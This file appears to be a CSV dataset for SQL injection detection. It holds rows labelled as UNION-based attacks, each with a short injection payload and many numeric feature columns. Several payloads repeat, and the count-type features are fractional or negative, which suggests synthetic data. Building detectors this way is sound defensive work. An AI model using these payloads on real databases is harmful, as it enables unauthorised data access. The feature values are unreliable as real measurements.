id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,payload_length,alpha_count,digit_count,space_count,upper_count,lower_count,symbol_count,printable_ratio,alpha_ratio,digit_ratio,space_ratio,symbol_ratio,entropy,single_quote_count,double_quote_count,dash_count,hash_count,slash_count,backslash_count,left_paren_count,right_paren_count,comma_count,semicolon_count,equals_count,greater_count,less_count,percent_count,plus_count,asterisk_count,at_count,url_encoded_count,hex_literal_count,unicode_escape_count,comment_marker_count,comparison_op_count,function_call_count,quoted_string_count,kw_select,kw_union,kw_where,kw_from,kw_sleep,kw_benchmark,kw_pg_sleep,kw_waitfor,kw_delay,kw_case,kw_when,kw_then,kw_else,kw_end,kw_exists,kw_order,kw_group,kw_having,kw_information_schema,kw_sysibm,kw_mysql,kw_sqlite,kw_substring,kw_substr,kw_ascii,kw_char,kw_cast,kw_convert,kw_concat,kw_update,kw_delete,kw_insert,kw_drop,kw_create,kw_table,kw_database,kw_user,kw_version,kw_and,kw_or,kw_not,kw_like,kw_by,sql_keyword_total,boolean_signal,union_signal,time_signal,error_signal,order_signal,exists_signal,stacked_signal
GAN_001604,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.0347843468324225,71.17903137207031,24.411455154418945,21.533693313598633,13.889912605285645,0.3645395040512085,21.791837692260742,9.990702629089355,0.7803364992141724,0.29613161087036133,0.3368279039859772,0.18582135438919067,0.14221422374248505,3.428048610687256,0.41456204652786255,0.3880666196346283,2.4134557247161865,0.649554967880249,0.4109770357608795,0.20084388554096222,-0.07955368608236313,1.140686273574829,4.9402079582214355,0.27432993054389954,0.3397771120071411,-0.025291690602898598,0.08672042191028595,0.26491010189056396,0.04032226279377937,0.3349834680557251,0.30014729499816895,-0.1764952391386032,-0.3565238118171692,-0.6826838850975037,1.0334357023239136,0.32146039605140686,0.11442691832780838,-0.020225809887051582,1.2022141218185425,0.767810046672821,0.3467673361301422,0.004147703759372234,-0.16136299073696136,-0.30771756172180176,0.1044314056634903,-0.5565003156661987,0.1514139622449875,0.7819051742553711,-0.31268614530563354,0.5081509947776794,0.09745648503303528,-0.10058651119470596,0.021605104207992554,0.2830233871936798,0.585808277130127,-0.03476664423942566,0.23395946621894836,-0.12418961524963379,0.13583573698997498,-0.20930685102939606,0.9103730320930481,0.06942786276340485,0.357493132352829,0.1671428680419922,0.2498289942741394,-0.29476436972618103,-0.3309383988380432,-0.5291317105293274,0.07509702444076538,-0.5724919438362122,-0.15039902925491333,0.055836427956819534,-0.07697012275457382,0.26811665296554565,-0.11741898953914642,0.1488504260778427,0.03540804237127304,-0.09399057924747467,-0.2686214745044708,-0.136198952794075,-0.17966081202030182,1.324061393737793,0.012745092622935772,0.7310986518859863,-0.33657699823379517,0.06277340650558472,-0.14980246126651764,0.4421554207801819,0.05942212790250778
GAN_001605,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.6089691370836645,72.77401733398438,32.07984161376953,12.361809730529785,16.709457397460938,0.9694485664367676,33.63140106201172,8.234298706054688,0.7959156036376953,0.4637002646923065,0.2101481407880783,0.19043971598148346,0.134349524974823,3.5452022552490234,0.5149503350257874,0.4813920855522156,2.2301180362701416,0.2884105145931244,0.8069746494293213,0.3079066574573517,0.0020657030399888754,1.256290316581726,4.845048427581787,0.5409847497940063,0.4901210069656372,0.22329966723918915,0.12123988568782806,0.17762573063373566,0.018432466313242912,0.2486339658498764,0.45690155029296875,-0.11631526052951813,-0.19089214503765106,-0.380765438079834,0.9729524254798889,0.27836713194847107,0.1332935094833374,-0.032098736613988876,1.2056981325149536,0.3902890086174011,0.38587161898612976,0.10120218247175217,-0.3896735906600952,-0.535250723361969,0.08635661751031876,-0.6505293846130371,0.4454791247844696,0.8020287752151489,-0.022880639880895615,0.1590072363615036,0.10782647132873535,-0.07734081894159317,-0.23821255564689636,0.2698226869106293,0.617278516292572,-0.21782559156417847,0.49501219391822815,-0.42131051421165466,-0.00491129606962204,-0.236056849360466,0.6186133027076721,-0.2909393906593323,0.9132062792778015,0.2707553207874298,0.14168792963027954,-0.29107657074928284,0.0035730935633182526,-0.19443374872207642,0.36420968174934387,-0.5104566216468811,-0.6957298517227173,0.01567627117037773,-0.07016919553279877,1.0263805389404297,-0.19003166258335114,0.2641165554523468,0.046024661511182785,-0.09420695900917053,-0.40523388981819153,-0.35943296551704407,-0.599907636642456,2.051990270614624,0.05721573531627655,1.0392560958862305,-0.1355649083852768,-0.31430983543395996,-0.29767170548439026,0.4939422905445099,-0.0905582532286644
GAN_001606,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.560835130639731,75.80728912353516,34.95759582519531,13.650591850280762,18.602787017822266,0.8972513675689697,36.661888122558594,8.253283500671387,0.8468449711799622,0.47188982367515564,0.20939414203166962,0.18629953265190125,0.13180410861968994,3.423886299133301,0.6827132701873779,0.5039711594581604,2.4727025032043457,0.41866621375083923,0.7692345976829529,0.3376290500164032,-0.052004747092723846,1.4249669313430786,5.367412567138672,0.708641767501831,0.5433662533760071,-0.04713407903909683,0.12371460348367691,0.2589212656021118,-0.007226536516100168,0.5054935216903687,0.5181740522384644,-0.08825714886188507,-0.7801260352134705,-0.1075265035033226,1.0212509632110596,0.14080362021923065,0.0970974937081337,-0.08416955918073654,1.187943458557129,0.23444968461990356,0.4696190059185028,-0.11597014218568802,-0.27799057960510254,-0.2712963819503784,0.16502141952514648,-0.8097193241119385,0.47992822527885437,1.1444201469421387,-0.23748037219047546,0.37239596247673035,0.5226411819458008,0.10411183536052704,-0.19975101947784424,0.5698323249816895,0.7189987301826477,-0.1803358495235443,0.5359023809432983,-0.5417116284370422,0.043028444051742554,-0.20227326452732086,1.0215234756469727,-0.37277597188949585,0.5070633888244629,0.4035121202468872,0.5336018204689026,-0.6014918684959412,-0.11714912950992584,-0.6116963028907776,0.730125367641449,-0.3984084129333496,-0.6493682265281677,0.17862257361412048,0.027697453275322914,1.353208065032959,-0.4430897831916809,0.15716029703617096,0.04293467476963997,-0.225236713886261,-0.24019689857959747,-0.6568894982337952,-0.3906347155570984,1.824404001235962,-0.026971589773893356,1.0708701610565186,-0.5192322134971619,-0.21933716535568237,-0.4520929157733917,0.8662123680114746,0.054249659180641174
GAN_001607,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,6.221487670298834,72.06005859375,35.65432357788086,12.336644172668457,20.046051025390625,0.24196475744247437,32.42247009277344,7.903573513031006,0.6740951538085938,0.4530046284198761,0.19329841434955597,0.17655476927757263,0.1230287104845047,3.4508752822875977,0.3208151161670685,0.5642156600952148,2.442145347595215,0.44923701882362366,0.9791176319122314,0.3385915756225586,-0.019334428012371063,1.6320323944091797,3.576127767562866,0.6337838768959045,0.6350163221359253,0.10246631503105164,0.10396336764097214,0.3522363603115082,-0.07573582977056503,0.4625445008277893,0.5076658129692078,0.021374229341745377,-0.6839435696601868,-0.2395744025707245,1.0083481073379517,0.022230759263038635,0.12410934269428253,8.345892274519429e-05,1.082520842552185,0.06510889530181885,0.28756362199783325,-0.05398670211434364,-0.3084813952445984,-0.39291927218437195,0.20199574530124664,-0.7593005895614624,0.3503186106681824,1.4892511367797852,0.0009000599384307861,0.17251168191432953,0.604716420173645,0.029761597514152527,0.0827251598238945,0.32128217816352844,0.9178734421730042,-0.046627119183540344,0.5975228548049927,-0.4790843725204468,-0.08172009140253067,-0.11907295137643814,1.5160807371139526,-0.7277861833572388,0.9329907894134521,0.5976555347442627,0.46040859818458557,-0.7571344375610352,-0.15514880418777466,-0.5334780812263489,0.9075559973716736,-0.5411399006843567,-0.645137369632721,0.15641571581363678,0.2958146929740906,1.5501710176467896,-0.47312188148498535,0.2586091160774231,0.07170169800519943,-0.23489704728126526,-0.7122549414634705,-0.7357299327850342,-0.3659835457801819,2.018143892288208,0.031105993315577507,0.9111762046813965,-0.9048562049865723,-0.2725304365158081,-0.4226611256599426,1.0939189195632935,0.16689498722553253
GAN_001608,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.1704752284493685,73.619873046875,23.66261100769043,27.736953735351562,17.616836547851562,-0.31801560521125793,18.707796096801758,10.383284568786621,0.8688770532608032,0.23598045110702515,0.42358240485191345,0.14255152642726898,0.15232665836811066,3.4535679817199707,0.3554874062538147,0.5423407554626465,2.1950302124023438,0.6794523000717163,0.4538954794406891,0.1416679471731186,-0.11700349301099777,1.3752344846725464,5.299559593200684,0.4173394739627838,0.14995647966861725,-0.6514101624488831,0.09157100319862366,0.4479679763317108,-0.03023167885839939,0.43573397397994995,0.33109381794929504,-0.0016209371387958527,-1.0013446807861328,-0.42013999819755554,1.0840054750442505,0.23831649124622345,0.11807442456483841,0.014786151237785816,1.1310110092163086,0.6940224170684814,0.2545820474624634,-0.2252839207649231,-0.2762773036956787,-0.4160486161708832,0.1539827138185501,-0.44972825050354004,0.004546878859400749,1.194460153579712,-0.4938444495201111,1.007443904876709,0.4147414565086365,-0.044897206127643585,0.05554383248090744,0.7065054774284363,0.8147919774055481,0.018763292580842972,0.36952367424964905,-0.4156365692615509,0.17465326189994812,-0.013041729107499123,1.5574204921722412,-0.17849783599376678,0.03933170437812805,0.3747616410255432,0.7653701305389404,-0.3862205445766449,-0.402596652507782,-1.026801347732544,0.2692890763282776,-0.24289923906326294,-0.16734088957309723,0.3848041892051697,-0.07846106588840485,0.7460834980010986,-0.026144124567508698,0.055563587695360184,0.033555541187524796,-0.25738072395324707,-0.44300711154937744,-0.2394176423549652,-0.20328792929649353,0.9117547869682312,-0.04464879259467125,0.9427968859672546,-0.9085279703140259,-0.06839396059513092,-0.42221441864967346,0.812847912311554,0.3229915201663971
GAN_001609,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.82798705457829,73.61620330810547,23.051992416381836,25.501365661621094,16.9207820892334,0.029496103525161743,22.544038772583008,9.237671852111816,1.0165654420852661,0.26701435446739197,0.4420490264892578,0.14801578223705292,0.15479467809200287,3.681882619857788,0.1768987476825714,0.43429622054100037,1.965954065322876,0.5510473847389221,0.7043623328208923,0.2181582897901535,-0.13343356549739838,0.8765190243721008,4.9610514640808105,0.3654245138168335,0.2446656972169876,-0.2810681462287903,0.1697794795036316,0.2617295980453491,0.047007180750370026,0.3819538354873657,0.6382555961608887,0.05792727693915367,-0.4091472029685974,-0.559752345085144,1.0397342443466187,0.10034783184528351,0.14325395226478577,-0.022828789427876472,1.1016052961349487,0.5775260925292969,0.25422677397727966,0.08485222607851028,-0.5072473287582397,-0.30317631363868713,0.27888941764831543,-0.474609375,0.24868696928024292,1.0605378150939941,-0.4714603126049042,0.614238440990448,0.0005917325615882874,-0.4511029124259949,0.17985732853412628,0.63127201795578,0.6739550828933716,-0.2963666021823883,0.5657380819320679,-0.5408909916877747,0.06460650265216827,-0.039388034492731094,1.1700618267059326,-0.12507414817810059,0.5117934942245483,0.30691832304000854,0.618333637714386,-0.22161076962947845,-0.2264534831047058,-0.28148218989372253,0.07155061513185501,-0.5751421451568604,-0.2695687413215637,0.23963773250579834,-0.6166397929191589,0.8189546465873718,0.06705308705568314,0.16119299829006195,0.05326466262340546,-0.06602519750595093,-0.6162706017494202,-0.06898313015699387,-0.5450718402862549,1.2826777696609497,0.12642337381839752,0.958800196647644,-0.6241524815559387,-0.2695044279098511,0.13859091699123383,0.6709993481636047,0.046773914247751236
GAN_001610,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,5.200486135167324,72.73539733886719,32.91706466674805,15.430901527404785,17.723289489746094,0.45755431056022644,32.59476852416992,8.736405372619629,0.9972215890884399,0.4436241686344147,0.21041324734687805,0.18079867959022522,0.12285031378269196,3.5072309970855713,0.4673985242843628,0.4394780397415161,1.9992491006851196,0.5481999516487122,0.5828601717948914,0.3453110456466675,-0.009298659861087799,1.5871541500091553,3.6353487968444824,0.3430955111980438,0.5423495173454285,0.2751061022281647,0.06014449894428253,0.3034278154373169,-0.003402197966352105,0.5202060341835022,0.6581487059593201,0.08896960318088531,-0.6356520056724548,-0.5025249719619751,0.9988821148872375,0.25309300422668457,0.06969007104635239,-0.007551270071417093,1.2092509269714355,0.19304847717285156,0.528380274772644,0.09073790907859802,-0.35428184270858765,-0.20285430550575256,0.4681728184223175,-0.4323655068874359,0.3259354829788208,0.8747001886367798,-0.44594019651412964,0.35778167843818665,0.1568695306777954,-0.15764698386192322,-0.21624311804771423,0.24436675012111664,0.7857327461242676,-0.015392177738249302,0.25368058681488037,-0.3966646194458008,0.23592549562454224,-0.3997032046318054,1.059282660484314,-0.25151604413986206,0.39789876341819763,0.36522287130355835,0.6373021602630615,-0.5795320868492126,-0.2927808165550232,-0.52164226770401,0.567718505859375,-0.5496553182601929,-0.6204102635383606,-0.1151169016957283,0.2168656289577484,0.9013379812240601,-0.2072991579771042,0.27331432700157166,0.06605313718318939,-0.21183744072914124,-0.5219454765319824,-0.5542612671852112,-0.38287433981895447,2.259244203567505,0.05096769332885742,1.0080124139785767,-0.3017630875110626,0.012504450976848602,-0.42707860469818115,0.8066783547401428,0.3222406208515167
GAN_001611,attack,union,"1""  )   where 8702  =  8702 union all select null,null,null,null,null--",nearest_attack_euclidean,R000144,4.958483619375765,71.30042266845703,36.087890625,13.944835662841797,19.053442001342773,0.39162278175354004,33.72300338745117,8.555438995361328,0.7170924544334412,0.47213295102119446,0.2182447463274002,0.18767757713794708,0.13096658885478973,3.5458810329437256,0.5165823698043823,0.4819827079772949,2.258767604827881,0.42177650332450867,0.5851049423217773,0.2991790771484375,0.03074779361486435,1.6756600141525269,4.1555495262146,0.56279456615448,0.4523822069168091,0.086076520383358,0.008559580892324448,0.20573678612709045,-0.045507948845624924,0.19987329840660095,0.47198086977005005,0.03015178069472313,-0.5838771462440491,-0.2913126051425934,1.0315368175506592,0.28928762674331665,0.07338088750839233,-0.02548929490149021,1.1857109069824219,0.17100828886032104,0.33259183168411255,0.038673412054777145,-0.3975776433944702,-0.25009462237358093,0.017775557935237885,-0.6177133321762085,0.4060727059841156,0.8209370374679565,-0.16910257935523987,-0.010410573333501816,0.3260709047317505,0.08714886009693146,-0.1000061184167862,-0.09031067788600922,0.6714387536048889,0.10321727395057678,0.55513596534729,-0.4404640793800354,-0.058194100856781006,0.04198440536856651,0.9825313091278076,-0.49717581272125244,0.48348551988601685,0.3450425863265991,0.4057389795780182,-0.5231916904449463,-0.023071859031915665,-0.5167996287345886,0.7426230311393738,-0.37193727493286133,-0.6967269778251648,0.20123441517353058,0.23277883231639862,1.0675010681152344,-0.23885636031627655,0.3406701385974884,0.041797272861003876,-0.2101753056049347,-0.46363452076911926,-0.5214409828186035,-0.4198342561721802,2.649608612060547,0.028013408184051514,0.9680471420288086,-0.578594982624054,-0.19032305479049683,-0.43911615014076233,0.8094621300697327,0.07358382642269135
GAN_001612,attack,union,"1'  )   as ekjw where 5477  =  5477 union all select null,null,null,null,null--",nearest_attack_euclidean,R000029,5.15785839086105,74.86031341552734,35.657527923583984,16.059040069580078,19.412860870361328,0.7309250831604004,39.26960754394531,7.973566055297852,0.8969614505767822,0.5068120360374451,0.13839949667453766,0.21041487157344818,0.10643115639686584,3.4632017612457275,0.7744975090026855,0.5188959240913391,2.5297908782958984,0.33901160955429077,0.8050121068954468,0.38900092244148254,0.02499428391456604,1.6957664489746094,4.4861884117126465,0.5570647120475769,0.6440162658691406,0.19862140715122223,0.09225600212812424,0.1804443895816803,0.01586531661450863,0.4496108889579773,0.48321881890296936,-0.077448770403862,-0.4326578974723816,0.03647564351558685,1.0167920589447021,0.18850396573543549,0.03891253471374512,-0.02300560660660267,1.1489812135696411,0.508446216583252,0.4346211552619934,-0.07328871637582779,-0.21967408061027527,-0.23341688513755798,0.4500832259654999,-0.7440764904022217,0.5374985933303833,0.8051742911338806,-0.3158988058567047,-0.013228824362158775,0.28104138374328613,0.3109276294708252,-0.19812634587287903,0.10667875409126282,0.6511780619621277,-0.1379840224981308,0.44192931056022644,-0.3182484805583954,-0.00696997344493866,-0.11144048720598221,0.7958732843399048,-0.6337547302246094,0.5394662618637085,0.2980729639530182,0.29593151807785034,-0.39035895466804504,-0.32035836577415466,-0.7335883975028992,0.8484811186790466,-0.41956591606140137,-0.7652375102043152,0.14001917839050293,0.20443135499954224,1.104317545890808,-0.25439703464508057,0.2943096160888672,0.05450303852558136,-0.21123036742210388,-0.1509021669626236,-0.6784783601760864,-0.1647196263074875,2.31613826751709,-0.023649532347917557,1.1362025737762451,-0.1698397547006607,-0.3031696379184723,-0.48594099283218384,0.8186887502670288,0.3431176543235779
GAN_001613,attack,union,"-4589""  )   union all select 1441,1441,1441,1441,1441,1441,1441,1441,1441,1441--",nearest_attack_euclidean,R000065,7.527316128353227,76.42792510986328,26.589570999145508,31.301485061645508,14.822561264038086,-0.7922260165214539,17.18900489807129,10.425220489501953,0.9233120083808899,0.08575377613306046,0.5919047594070435,0.08381982892751694,0.17837204039096832,3.1612749099731445,-0.04182200878858566,0.5349101424217224,2.569885492324829,0.6865327954292297,0.785031259059906,0.2460196167230606,-0.4622604250907898,0.5890452861785889,6.54603385925293,0.807735800743103,-0.24625162780284882,-1.0382999181747437,0.11882367730140686,0.5702300667762756,-0.19497394561767578,0.16689081490039825,0.4786723852157593,-0.19824610650539398,-1.4171490669250488,-0.8377126455307007,0.9451125860214233,0.05507276952266693,0.22788497805595398,-0.0767672136425972,0.9723695516586304,0.36518847942352295,-0.034133825451135635,0.0010948731796815991,-0.2784496247768402,-0.6921951174736023,0.0015123151242733002,-0.40293335914611816,0.8271456360816956,1.8398618698120117,-0.4263773262500763,0.7569589018821716,0.3841080069541931,-0.7743436098098755,0.036838337779045105,0.881960928440094,1.405207633972168,-0.5947055220603943,0.7255165576934814,-0.7638382315635681,0.068573497235775,-0.05984165146946907,2.3017754554748535,-0.3051719069480896,0.8597568869590759,0.5479727983474731,0.6397834420204163,-0.2002861201763153,-0.5008106827735901,-0.9123418927192688,0.09418702125549316,-0.7181046009063721,-0.41594845056533813,0.5630098581314087,-1.0112762451171875,1.0389525890350342,-0.3125501275062561,-0.01562860980629921,0.05732511356472969,-0.3479434847831726,-1.070150375366211,-0.47462913393974304,-0.7015584111213684,-1.2746597528457642,-0.06451502442359924,0.643119752407074,-1.0450249910354614,-0.10030078887939453,-0.5280741453170776,1.1136623620986938,-0.2170972228050232
GAN_001614,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.451234083702826,72.97881317138672,21.85805892944336,26.507808685302734,13.930098533630371,-0.3824709951877594,19.19895362854004,10.576881408691406,0.8731361627578735,0.2277836948633194,0.46230170130729675,0.1559092253446579,0.15397348999977112,3.394411325454712,0.3812565803527832,0.39135029911994934,2.3223154544830322,0.5733509063720703,0.4225568175315857,0.17681893706321716,-0.20283351838588715,0.98664391040802,5.7260894775390625,0.5870568156242371,-0.031543273478746414,-0.07818568497896194,0.07446801662445068,0.40889737010002136,0.024132808670401573,0.1874637007713318,0.2225201278924942,-0.0694555938243866,-0.645570695400238,-0.5697228312492371,1.0132648944854736,0.3722996711730957,0.14471709728240967,-0.009474518708884716,1.2408082485198975,0.6513265371322632,0.25191205739974976,-0.00010550480510573834,-0.19628304243087769,-0.41166627407073975,-0.06118682026863098,-0.11485492438077927,0.48534685373306274,0.7949217557907104,-0.5440596342086792,0.6677576303482056,-0.0004978105425834656,-0.20051756501197815,-0.009764336049556732,0.16086189448833466,0.7460198402404785,-0.14501504600048065,0.26185035705566406,-0.5430098176002502,0.04835931211709976,0.023344647139310837,1.1133365631103516,0.07737340033054352,0.34893831610679626,0.1805092692375183,0.3196500837802887,-0.1049714982509613,-0.4486636221408844,-0.747987687587738,-0.01550380140542984,-0.5929199457168579,-0.05599290132522583,0.05563467741012573,-0.4780259430408478,0.5001147389411926,0.03640344738960266,0.14484678208827972,0.04609380289912224,-0.20568686723709106,-0.30300116539001465,-0.11326407641172409,-0.3748551905155182,0.7967700362205505,-0.04645221307873726,0.751413106918335,-0.38196370005607605,0.13668347895145416,-0.34861302375793457,0.49263229966163635,0.21466022729873657
GAN_001615,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.159948371594536,72.15799713134766,25.43395233154297,24.407743453979492,14.993234634399414,-0.049156635999679565,19.082983016967773,10.356671333312988,0.7299653887748718,0.27364814281463623,0.3713766038417816,0.1418004035949707,0.15543323755264282,3.5986502170562744,0.45727860927581787,0.53697270154953,1.8420920372009277,0.5360027551651001,0.28709542751312256,0.10725551843643188,-0.05515124648809433,0.9085487723350525,4.830679893493652,0.46134573221206665,0.1905864030122757,-0.14704181253910065,0.09816018491983414,0.2782350480556488,0.07198173552751541,0.36124274134635925,0.32585474848747253,0.03867560252547264,-0.4418037533760071,-0.38537323474884033,1.0337986946105957,0.40724068880081177,0.0525781624019146,-0.038170356303453445,1.2498387098312378,0.6415122747421265,0.28621146082878113,-0.06558149307966232,-0.1393314003944397,-0.5395718216896057,0.006756439805030823,-0.5119576454162598,0.08748290687799454,0.9243869781494141,-0.29472875595092773,0.5701552629470825,0.14610330760478973,-0.17364153265953064,0.0921449363231659,0.5117452144622803,0.5409528613090515,0.009746383875608444,0.35688456892967224,-0.1083928644657135,0.28974229097366333,0.018481794744729996,0.9253764152526855,-0.07098168134689331,0.08469151705503464,0.41426709294319153,0.5797578692436218,-0.09496999531984329,-0.44890597462654114,-0.469373494386673,-0.046963781118392944,-0.2848989963531494,-0.1037784069776535,-0.07947694510221481,-0.4386886954307556,0.5548935532569885,-0.06625545024871826,0.13402624428272247,0.025389274582266808,-0.06889942288398743,-0.4109500050544739,-0.34560924768447876,-0.335222452878952,1.094389796257019,-0.003243961138650775,0.9640821218490601,-0.3767895996570587,0.10815852880477905,-0.3300930857658386,0.1480691134929657,0.1120448037981987
GAN_001616,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.642927856695059,72.2318115234375,34.419742584228516,18.10348129272461,16.07339096069336,0.4114328920841217,29.88630485534668,8.998092651367188,0.917375922203064,0.3595406413078308,0.3175167143344879,0.16643869876861572,0.14651203155517578,3.3225903511047363,0.4423573911190033,0.5713480114936829,2.2120039463043213,0.4441758692264557,0.5669620037078857,0.22746354341506958,-0.11212799698114395,1.2392876148223877,5.236138820648193,1.0599969625473022,0.11828310042619705,0.29037871956825256,0.06750304996967316,0.4045160710811615,-0.10772465914487839,0.23493103682994843,0.41686391830444336,-0.1296187788248062,-0.6327047348022461,-0.36591535806655884,0.9847270250320435,0.4715149402618408,0.18165268003940582,-0.041650887578725815,1.2162353992462158,-0.0469437837600708,0.34609851241111755,0.01773872599005699,-0.29540860652923584,-0.5232675671577454,-0.1345514953136444,-0.4411446452140808,0.8772133588790894,1.076660394668579,-0.035340566188097,0.18989335000514984,0.23490138351917267,-0.1053231731057167,-0.23254722356796265,0.14356492459774017,0.9346809387207031,-0.058428216725587845,0.35830116271972656,-0.3100091516971588,0.11974924802780151,-0.01789201609790325,1.0513113737106323,-0.20517753064632416,0.7229707837104797,0.5301200151443481,0.26957812905311584,-0.11652315407991409,-0.4606627821922302,-0.34565269947052,0.5919728875160217,-0.678604006767273,-0.3808065950870514,0.1468353420495987,-0.1597982943058014,1.2085977792739868,-0.21661971509456635,0.23891565203666687,0.05130903795361519,-0.20661279559135437,-0.4906369149684906,-0.33864811062812805,-0.6250516176223755,1.3796619176864624,-0.042748112231492996,0.9778546690940857,-0.20593491196632385,-0.018506985157728195,-0.840797483921051,0.591074526309967,0.04846334457397461
GAN_001617,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,4.113755508191494,72.24418640136719,26.20960235595703,26.922168731689453,14.640748977661133,0.06317999958992004,18.75003433227539,10.20843505859375,1.0383548736572266,0.25265631079673767,0.3878786861896515,0.1646534949541092,0.15083380043506622,3.4943740367889404,0.14812549948692322,0.43139955401420593,2.28999400138855,0.6423983573913574,0.4237753748893738,0.10888095945119858,-0.13608406484127045,1.1870684623718262,4.800156593322754,0.33563432097435,0.24696077406406403,-0.10663115233182907,0.15324647724628448,0.30848607420921326,0.002549705794081092,0.3793679475784302,0.4775131344795227,-0.076241135597229,-0.42086970806121826,-0.3852992653846741,1.0457278490066528,0.2065153568983078,0.1552581638097763,-0.03990110382437706,1.1684719324111938,0.6147356033325195,0.3025875687599182,-0.09250030666589737,-0.10943648964166641,-0.16029497981071472,0.13677197694778442,-0.4042501449584961,0.22634954750537872,0.9970175623893738,-0.27965670824050903,0.60201495885849,0.07213790714740753,-0.1115228608250618,0.1675490140914917,0.5756285190582275,0.7734228372573853,-0.08903878927230835,0.309906929731369,-0.22754324972629547,0.06572669744491577,-0.10891235619783401,0.9264041781425476,-0.1384570598602295,0.3187689483165741,0.2915463447570801,0.3222898840904236,-0.10222912579774857,-0.33785662055015564,-0.4433721899986267,0.06006189435720444,-0.566679060459137,0.015050295740365982,0.11576616019010544,-0.3583892285823822,0.4364655017852783,-0.09519034624099731,0.1387525200843811,0.03673749417066574,-0.06530842185020447,-0.44459348917007446,-0.08267314732074738,-0.35567203164100647,0.9609789252281189,0.007701709400862455,1.0168288946151733,-0.44533610343933105,-0.1025930643081665,-0.03365456312894821,0.46789315342903137,-0.03537523001432419
GAN_001618,attack,union,"-3710   )    )    union all select 5770,5770,5770,5770,5770,5770,5770#",nearest_attack_euclidean,R000103,5.605261981753194,73.62318420410156,23.116453170776367,31.891067504882812,17.4219913482666,-0.11703971028327942,19.21000099182129,10.470743179321289,1.0496224164962769,0.18338575959205627,0.43081510066986084,0.13081735372543335,0.14941740036010742,3.3435122966766357,0.4075366258621216,0.44811585545539856,2.4478325843811035,0.7263324856758118,0.5696699023246765,0.1702294945716858,-0.2491571456193924,1.0304337739944458,4.742125988006592,0.8211788535118103,0.16409023106098175,-0.27195796370506287,0.085019551217556,0.4857066571712494,-0.015302496030926704,0.48347413539886475,0.5403031706809998,0.17314596474170685,-0.8804861903190613,-0.3329339623451233,1.022714614868164,0.17813940346240997,0.09866852313280106,-0.10163941234350204,1.1837687492370605,0.6296427249908447,0.28800565004348755,-0.16739240288734436,-0.17853915691375732,-0.436487078666687,0.20095644891262054,-0.3523029088973999,0.16813792288303375,1.3362398147583008,-0.5448694825172424,0.6817293763160706,0.5310372114181519,-0.3184117078781128,0.0405966192483902,0.4123840034008026,0.6136716604232788,-0.3573722541332245,0.726593554019928,-0.4375976026058197,0.25814515352249146,0.20592468976974487,1.7298047542572021,-0.09178508818149567,0.35909849405288696,0.27620434761047363,0.7347274422645569,-0.45915132761001587,-0.8919922113418579,-0.8100144863128662,0.23239123821258545,-0.3447876572608948,-0.2628771960735321,0.3711824417114258,-0.3341674208641052,0.795336127281189,-0.3599250316619873,0.043813686817884445,0.04706423729658127,-0.22277569770812988,-0.6461758017539978,-0.3547951877117157,-0.17652487754821777,0.16043703258037567,-0.021009113639593124,0.8591833114624023,-0.8642967343330383,0.2164924293756485,-0.43792691826820374,0.7223694920539856,0.3119657337665558
